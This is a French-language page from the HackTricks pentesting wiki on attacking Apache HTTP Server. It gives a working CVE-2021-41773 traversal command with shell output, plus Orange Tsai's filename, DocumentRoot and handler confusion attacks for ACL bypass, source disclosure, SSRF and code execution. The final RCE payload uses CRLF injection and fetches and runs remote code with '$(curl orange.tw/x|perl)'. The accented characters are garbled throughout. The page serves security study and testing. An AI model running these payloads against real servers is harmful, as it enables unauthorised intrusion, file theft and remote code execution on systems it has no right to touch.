# Apache

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## Extensions PHP ex√©cutables

V√©rifiez quelles extensions sont ex√©cut√©es par le serveur Apache. Pour les rechercher, vous pouvez ex√©cuter :
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
Aussi, certains endroits o√π vous pouvez trouver cette configuration sont :
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773

{% code overflow="wrap" %}
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
{% endcode %}

## Attaque de confusion <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

Ces types d'attaques ont √©t√© introduits et document√©s [**par Orange dans cet article de blog**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1) et ce qui suit est un r√©sum√©. L'attaque de "confusion" abuse essentiellement de la fa√ßon dont les dizaines de modules qui travaillent ensemble pour cr√©er un Apache ne fonctionnent pas parfaitement synchronis√©s, et faire en sorte que certains d'entre eux modifient des donn√©es inattendues peut provoquer une vuln√©rabilit√© dans un module ult√©rieur.

### Confusion de nom de fichier

#### Troncature

Le **`mod_rewrite`** va tronquer le contenu de `r->filename` apr√®s le caract√®re `?` ([_**modules/mappers/mod\_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod\_rewrite.c#L4141)). Ce n'est pas totalement faux car la plupart des modules traiteront `r->filename` comme une URL. Mais dans d'autres occasions, cela sera trait√© comme un chemin de fichier, ce qui pourrait poser un probl√®me.

* **Troncature de chemin**

Il est possible d'abuser de `mod_rewrite` comme dans l'exemple de r√®gle suivant pour acc√©der √† d'autres fichiers √† l'int√©rieur du syst√®me de fichiers, en supprimant la derni√®re partie du chemin attendu en ajoutant simplement un `?`:
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
#¬†the output of file `/var/user/orange/secret.yml`
```
* **Affectation trompeuse de RewriteFlag**

Dans la r√®gle de r√©√©criture suivante, tant que l'URL se termine par .php, elle sera trait√©e et ex√©cut√©e comme du php. Par cons√©quent, il est possible d'envoyer une URL qui se termine par .php apr√®s le caract√®re `?` tout en chargeant dans le chemin un type de fichier diff√©rent (comme une image) contenant du code php malveillant √† l'int√©rieur :
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **Bypass d'ACL**

Il est possible d'acc√©der √† des fichiers auxquels l'utilisateur ne devrait pas avoir acc√®s, m√™me si l'acc√®s devrait √™tre refus√© avec des configurations telles que :
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
C'est parce que par d√©faut, PHP-FPM recevra des URL se terminant par `.php`, comme `http://server/admin.php%3Fooo.php` et parce que PHP-FPM supprimera tout ce qui suit le caract√®re `?`, l'URL pr√©c√©dente permettra de charger `/admin.php` m√™me si la r√®gle pr√©c√©dente l'interdisait.

### DocumentRoot Confusion
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
Un fait amusant √† propos d'Apache est que la r√©√©criture pr√©c√©dente essaiera d'acc√©der au fichier √† la fois depuis le documentRoot et depuis la racine. Ainsi, une requ√™te √† `https://server/abouth.html` v√©rifiera la pr√©sence du fichier dans `/var/www/html/about.html` et `/about.html` dans le syst√®me de fichiers. Ce qui peut essentiellement √™tre exploit√© pour acc√©der √† des fichiers dans le syst√®me de fichiers.

#### **Divulgation de code source c√¥t√© serveur**

* **Divulguer le code source CGI**

Il suffit d'ajouter un %3F √† la fin pour divulguer le code source d'un module cgi :
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
* **Divulguer le code source PHP**

Si un serveur a diff√©rents domaines dont l'un est un domaine statique, cela peut √™tre exploit√© pour traverser le syst√®me de fichiers et leak du code php :
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **Manipulation des gadgets locaux**

Le principal probl√®me avec l'attaque pr√©c√©dente est qu'en r√®gle g√©n√©rale, la plupart des acc√®s au syst√®me de fichiers seront refus√©s comme dans le [mod√®le de configuration](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115) du serveur HTTP Apache :
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
Cependant, les syst√®mes d'exploitation [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) autorisent par d√©faut `/usr/share` :
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
Donc, il serait possible d'**abuser des fichiers situ√©s dans `/usr/share` dans ces distributions.**

**Gadget local pour la divulgation d'informations**

* **Apache HTTP Server** avec **websocketd** peut exposer le script **dump-env.php** √† **/usr/share/doc/websocketd/examples/php/**, ce qui peut leak des variables d'environnement sensibles.
* Les serveurs avec **Nginx** ou **Jetty** pourraient exposer des informations sensibles sur les applications web (par exemple, **web.xml**) √† travers leurs racines web par d√©faut plac√©es sous **/usr/share** :
* **/usr/share/nginx/html/**
* **/usr/share/jetty9/etc/**
* **/usr/share/jetty9/webapps/**

**Gadget local pour XSS**

* Sur Ubuntu Desktop avec **LibreOffice install√©**, exploiter la fonctionnalit√© de changement de langue des fichiers d'aide peut conduire √† un **Cross-Site Scripting (XSS)**. Manipuler l'URL √† **/usr/share/libreoffice/help/help.html** peut rediriger vers des pages malveillantes ou des versions ant√©rieures via **unsafe RewriteRule**.

**Gadget local pour LFI**

* Si PHP ou certains packages front-end comme **JpGraph** ou **jQuery-jFeed** sont install√©s, leurs fichiers peuvent √™tre exploit√©s pour lire des fichiers sensibles comme **/etc/passwd** :
* **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
* **/usr/share/javascript/jquery-jfeed/proxy.php**
* **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

**Gadget local pour SSRF**

* En utilisant **MagpieRSS's magpie\_debug.php** √† **/usr/share/php/magpierss/scripts/magpie\_debug.php**, une vuln√©rabilit√© SSRF peut √™tre facilement cr√©√©e, fournissant une porte d'entr√©e pour d'autres exploits.

**Gadget local pour RCE**

* Les opportunit√©s pour **Remote Code Execution (RCE)** sont vastes, avec des installations vuln√©rables comme un **PHPUnit** obsol√®te ou **phpLiteAdmin**. Celles-ci peuvent √™tre exploit√©es pour ex√©cuter du code arbitraire, montrant le potentiel √©tendu de la manipulation des gadgets locaux.

#### **Jailbreak √† partir de gadgets locaux**

Il est √©galement possible de jailbreaker √† partir des dossiers autoris√©s en suivant les symlinks g√©n√©r√©s par les logiciels install√©s dans ces dossiers, comme :

* **Cacti Log** : `/usr/share/cacti/site/` -> `/var/log/cacti/`
* **Solr Data** : `/usr/share/solr/data/` -> `/var/lib/solr/data`
* **Solr Config** : `/usr/share/solr/conf/` -> `/etc/solr/conf/`
* **MediaWiki Config** : `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
* **SimpleSAMLphp Config** : `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

De plus, en abusant des symlinks, il a √©t√© possible d'obtenir **RCE dans Redmine.**

### Confusion de gestionnaire <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

Cette attaque exploite le chevauchement de fonctionnalit√© entre les directives `AddHandler` et `AddType`, qui peuvent toutes deux √™tre utilis√©es pour **activer le traitement PHP**. √Ä l'origine, ces directives affectaient diff√©rents champs (`r->handler` et `r->content_type` respectivement) dans la structure interne du serveur. Cependant, en raison de code h√©rit√©, Apache g√®re ces directives de mani√®re interchangeable dans certaines conditions, convertissant `r->content_type` en `r->handler` si le premier est d√©fini et le second ne l'est pas.

De plus, dans le serveur Apache HTTP (`server/config.c#L420`), si `r->handler` est vide avant d'ex√©cuter `ap_run_handler()`, le serveur **utilise `r->content_type` comme gestionnaire**, rendant effectivement `AddType` et `AddHandler` identiques en effet.

#### **√âcraser le gestionnaire pour divulguer le code source PHP**

Dans [**cette pr√©sentation**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013\_dmitriev-maksim.pdf), une vuln√©rabilit√© a √©t√© pr√©sent√©e o√π un `Content-Length` incorrect envoy√© par un client peut amener Apache √† **retourner le code source PHP**. Cela √©tait d√ª √† un probl√®me de gestion des erreurs avec ModSecurity et l'Apache Portable Runtime (APR), o√π une double r√©ponse conduit √† √©craser `r->content_type` en `text/html`.\
Parce que ModSecurity ne g√®re pas correctement les valeurs de retour, il retournerait le code PHP et ne l'interpr√©terait pas.

#### **√âcraser le gestionnaire pour XXXX**

TODO : Orange n'a pas encore divulgu√© cette vuln√©rabilit√©

### **Inviter des gestionnaires arbitraires**

Si un attaquant est capable de contr√¥ler l'en-t√™te **`Content-Type`** dans une r√©ponse du serveur, il sera en mesure d'**inviter des gestionnaires de module arbitraires**. Cependant, au moment o√π l'attaquant contr√¥le cela, la plupart du processus de la demande sera d√©j√† effectu√©. Cependant, il est possible de **red√©marrer le processus de demande en abusant de l'en-t√™te `Location`** car si le `Status` retourn√© est 200 et que l'en-t√™te `Location` commence par un `/`, la r√©ponse est trait√©e comme une redirection c√¥t√© serveur et doit √™tre trait√©e.

Selon [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875) (sp√©cification sur CGI) dans [Section 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) d√©finit un comportement de r√©ponse de redirection locale :

> Le script CGI peut retourner un chemin URI et une cha√Æne de requ√™te (‚Äòlocal-pathquery‚Äô) pour une ressource locale dans un champ d'en-t√™te Location. Cela indique au serveur qu'il doit reprocesser la demande en utilisant le chemin sp√©cifi√©.

Donc, pour effectuer cette attaque, l'une des vuln√©rabilit√©s suivantes est n√©cessaire :

* Injection CRLF dans les en-t√™tes de r√©ponse CGI
* SSRF avec contr√¥le complet des en-t√™tes de r√©ponse

#### **Gestionnaire arbitraire pour la divulgation d'informations**

Par exemple, `/server-status` ne devrait √™tre accessible que localement :
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
Il est possible d'y acc√©der en d√©finissant le `Content-Type` sur `server-status` et l'en-t√™te Location commen√ßant par `/`
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **Gestionnaire arbitraire vers SSRF complet**

Redirection vers `mod_proxy` pour acc√©der √† n'importe quel protocole sur n'importe quelle URL :
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
Cependant, l'en-t√™te `X-Forwarded-For` est ajout√©, emp√™chant l'acc√®s aux points de terminaison de m√©tadonn√©es cloud.

#### **Gestionnaire arbitraire pour acc√©der au socket de domaine Unix local**

Acc√©dez au socket de domaine Unix local de PHP-FPM pour ex√©cuter un backdoor PHP situ√© dans `/tmp/`:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **Gestionnaire arbitraire pour RCE**

L'image officielle [PHP Docker](https://hub.docker.com/\_/php) inclut PEAR (`Pearcmd.php`), un outil de gestion de paquets PHP en ligne de commande, qui peut √™tre abus√© pour obtenir RCE :
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
V√©rifiez le [**R√©sum√© Docker PHP LFI**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), √©crit par [Phith0n](https://x.com/phithon\_xg) pour les d√©tails de cette technique.

## R√©f√©rences

* [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* V√©rifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
